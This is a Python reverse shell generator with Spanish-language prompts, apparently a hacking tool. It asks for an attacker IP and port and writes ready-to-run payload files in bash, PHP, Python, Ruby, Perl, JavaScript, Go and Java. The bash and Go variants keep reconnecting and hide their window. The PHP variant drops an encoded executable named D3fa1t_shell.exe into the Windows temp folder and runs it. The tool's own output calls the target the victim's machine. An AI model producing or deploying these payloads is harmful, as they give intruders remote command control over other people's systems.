# _*_ ecoding: utf-8 _*_
import os,sys
W = '\033[37m'
R = '\033[1;31m'  # red
G = '\033[1;32m'  # green
O = '\033[0;33m'  # orange
B = '\033[1;34m'  # blue
P = '\033[1;35m'  # purple
C = '\033[1;36m'  # cyan

sh = os.system
e = "\n"
## Validador:
sistema = sys.platform

#Correr Software
def clear():
	if sistema == 0:
		print(R+"[-] Sistema Operativo no valido, saliendo...")
		exit()
	elif "windows" in sistema:
		sh("cls")
	else:
		sh("clear")
def Module(module):
	clear()
	banner()
	ip = input(C+"IP a configurar Reverse Shell >> "+O)
	port = input(C+"Puerto a configurar Reverse Shell >> "+O)
	nombre = input(C+"Nombre del archivo >> "+W)

	if module == "bash":
		clear()
		banner()
		filename = nombre+".sh"
		f = open(filename, 'w')
		f.write("#!/bin/bash"+e)
		f.write("DST_IP="+ip+e)
		f.write("DST_PORT="+port+e)
		f.write("while [ true ]"+e)
		f.write("        do"+e)
		f.write("                bash -i >& /dev/tcp/$DST_IP/$DST_PORT 0>&1"+e)
		f.write("                sleep 10"+e)
		f.write("done > /dev/null 2>&1"+e)
		f.close()
		print(G+"[+] "+W+"Reverse Shell Generada exitosamente.")
	elif module == "php":
		clear()
		banner()
		print(O+"ADVERTENCIA: "+W+"El modulo de PHP solo esta disponible para Windows!")
		filename = nombre+".php"
		f = open(filename, 'w')
		f.write("<?php\n\n")
		f.write("header('Content-type: text/plain');"+e)
		f.write("$ip = '"+ip+"';"+e)
		f.write("$port = "+port+e)
		f.write("$payload = '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';"+e)
		f.write("$evalCode = gzinflate(base64_decode($payload));"+e)
		f.write("$evalArguments = ' '.$port.' '.$ip;"+e)
		f.write("$tmpdir = 'C:\\windows\\temp';"+e)
		f.write("chdir($tmpdir);"+e)
		f.write("$res .= 'Using dir : '.$tmpdir;"+e)
		f.write("$filename = 'D3fa1t_shell.exe';"+e)
		f.write("$file = fopen($filename, 'wb');"+e)
		f.write("fwrite($file, $evalCode);"+e)
		f.write("fclose($file);"+e)
		f.write("$path = $filename;"+e)
		f.write("$cmd = $path.$evalArguments;"+e)
		f.write("$res .= '\n\nExecuting : '.$cmd.'\n';"+e)
		f.write("//echo $res;"+e)
		f.write("$output = system($cmd);"+e)
		f.close()
		print(G+"[+] "+W+"Reverse Shell Generada exitosamente.")
		print(O+"Nota: "+W+"Si desea mostrar que comandos se usan en la maquina victima\n descomente la linea donde se encuentra 'echo $res'")
	elif module == "python":
		sistema = input(G+"Sistema Operativo Objetivo (Windows/Linux) >> "+W)
		clear()
		banner()
		filename = nombre+".py"
		f = open(filename, 'w')
		f.write("import socket,subprocess,os;\n")
		f.write("s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\ns.connect(('"+ip+"',"+port+"));\nos.dup2(s.fileno(),0);")
		f.write("os.dup2(s.fileno(),1);"+e)
		f.write("os.dup2(s.fileno(),2);"+e)
		if sistema == 0 or sistema == '':
			print(R+"[-] Sistema operativo desconocido...")
			exit()
		elif "w" in sistema or "W" in sistema:
			f.write("p=subprocess.call(['cmd.exe']);"+e)
		else:
			f.write("p=subprocess.call(['/bin/sh','-i']);"+e)
		f.close()
		print(G+"[+] "+W+"Reverse Shell Generada exitosamente.")
	elif module == "ruby":
		clear()
		banner()
		filename = nombre+".rb"
		f = open(filename, 'w')
		f.write("exit if fork;c=TCPSocket.new('"+ip+"','"+port+"');"+e)
		f.write("while(cmd=c.gets);"+e)
		f.write("IO.popen(cmd,'r'){|io|c.print io.read}end")
		f.close()
		print(G+"[+] "+W+"Reverse Shell Generada exitosamente.")
	elif module == "perl":
		sistema = input("Que sistema Operativo cuenta el objetivo ? (Windows/Linux) >> "+W)
		if sistema == 0 or sistema == "":
			print(R+"[-] Sistema Operativo invalido..")
			exit()
		elif "W" in sistema or "w" in sistema:
			clear()
			banner()
			filename = nombre+".pl"
			f = open(filename, 'w')
			f.write("$c=new IO::Socket::INET(PeerAddr,'"+ip+":"+port+"');"+e)
			f.write("STDIN->fdopen($c,r);$~->fdopen($c,w);\nsystem$_ while<>;")
			f.close()
			print(G+"[+] "+W+"Reverse Shell Generada exitosamente.")
		else:
			clear()
			banner()
			filename = nombre+".pl"
			f.write("use Socket;$i='"+ip+"';$p="+port+";"+e)
			f.write("socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));")
			f.write("if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,'>&S');"+e)
			f.write("open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};")
			f.close()
			print(G+"[+] "+W+"Reverse Shell Generada exitosamente.")
	elif module == "javascript":
		clear()
		banner()
		filename = nombre+".js"
		f = open(filename, 'w')
		f.write("(function(){ var net = require('net'), cp = require('child_process'), sh = cp.spawn('/bin/sh', []);var client = new net.Socket(); client.connect("+port+", '"+ip+"', function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();")
		f.close()
		print(G+"[+] "+W+"Reverse Shell Generada exitosamente.")
	elif module == "go":
		clear()
		banner()
		filename = nombre+".go"
		f = open(filename, 'w')
		f.write("package main"+e)
		f.write("import ("+e)
		f.write("    'bufio'"+e)
		f.write("    'net'"+e)
		f.write("    'os/exec'"+e)
		f.write("    'syscall'"+e)
		f.write("    'time'"+e)
		f.write(")"+e+e)
		f.write("func main() {"+e)
		f.write("	reverse('"+ip+":"+port+"')"+e)
		f.write("}"+e)
		f.write("func reverse(host string) {"+e)
		f.write("	c, err := net.Dial('tcp', host)"+e)
		f.write("	if nil != err {"+e)
		f.write("		if nil != c {"+e)
		f.write("			c.Close()"+e)
		f.write("		}"+e)
		f.write("		time.Sleep(time.Minute)"+e)
		f.write("		reverse(host)"+e)
		f.write("	}"+e)
		f.write("	r := bufio.NewReader(c)"+e)
		f.write("	for {"+e)
		f.write("order, err := r.ReadString('\n')"+e)
		f.write("		if nil != err {"+e)
		f.write("			c.Close()"+e)
		f.write("			reverse(host)"+e)
		f.write("			return"+e)
		f.write("		}"+e)
		f.write("		cmd := exec.Command('cmd', '/C', order)"+e)
		f.write("		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}"+e)
		f.write("		out, _ := cmd.CombinedOutput()"+e)
		f.write("		c.Write(out)"+e)
		f.write("}\n}")
		f.close()
		print(G+"[+] "+W+"Reverse Shell Generada exitosamente.")
	elif module == "java":
		sistema = input("Que sistema Operativo cuenta el objetivo ? (Windows/Linux) >> "+W)
		if sistema == 0 or sistema == "":
			print(R+"[-] Sistema Operativo invalido..")
		elif "W" in sistema or "w" in sistema:
			command = input(G+"Comando a ejecutar en el SO >> "+O)
			clear()
			banner()
			filename = nombre+".java"
			f = open(filename, 'w')
			f.write("r = Runtime.getRuntime();"+e)
			f.write("p = r.exec('"+command+"');"+e)
			f.write("p.waitFor();"+e)
			f.close()
			print(G+"[+] "+W+"Reverse Shell Generada exitosamente.")
		else:
			clear()
			banner()
			filename = nombre+".java"
			f = open(filename, 'w')
			f.write("r = Runtime.getRuntime();"+e)
			f.write("p = r.exec(['/bin/bash','-c','exec 5<>/dev/tcp/"+ip+"/"+port+";cat <&5 | while read line; do \$line 2>&5 >&5; done'] as String[])"+e)
			f.write("p.waitFor();"+e)
			f.close()
			print(G+"[+] "+W+"Reverse Shell Generada exitosamente.")


def banner():
	print(G+"""
⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠏⢁⣤⣤⣶⣄⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⡿⠀⣿⣿⣿⣿⣿⣷⣄⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣇⠘⢿⣿⣿⣿⣿⣿⣿⣷⣄⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣷⣄⠙⢿⣿⣿⣿⣿⣿⡇⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣷⣄⠙⠿⠿⠿⠟⠁⣈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠟⠛⢛⣿
⣿⣿⣿⣿⣿⣿⣷⣤⣶⣶⣦⠈⠋⣠⣤⠈⠻⣿⣿⣿⣿⡀⢠⣤⣶⣶⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠙⢁⣴⡦⠈⠻⣿⣿⡇⢸⣿⡟⢉⠉⠙⠛⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠉⢠⣶⠆⠈⠻⣧⠀⡿⠀⣾⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⢰⡿⠀⡈⠀⠁⣼⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠾⠋⣠⠀⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⢀⣈⡉⠁⠀⠈⠋⣠⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠗⠀⠁⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⣿⣿⣦⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣿⣿⣿⣷⣤⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿ RS Generator - HBHackig
                                        By Mrx04programmer\n""")
def main():
	clear()
	banner()
	print(G+"Modulos Disponibles:"+O)
	print(" 0. module/bash\n 1. module/php \n 2. module/python\n 3. module/ruby\n 4. module/perl\n 5. module/javascript\n 6. module/go\n 7. module/java")
	module = input(G+"Modulo a usar >>"+W)

	if module == "0":
		Module("bash")
	elif module == "1":
		Module("php")
	elif module == "2":
		Module("python")
	elif module == "3":
		Module("ruby")
	elif module == "4":
		Module("perl")
	elif module == "5":
		Module("javascript")
	elif module == "6":
		Module("go")
	elif module == "7":
		Module("java")





if __name__ == '__main__':
	try:
		main()
	except Exception as e:
		print(R+"Error de "+e)
		exit()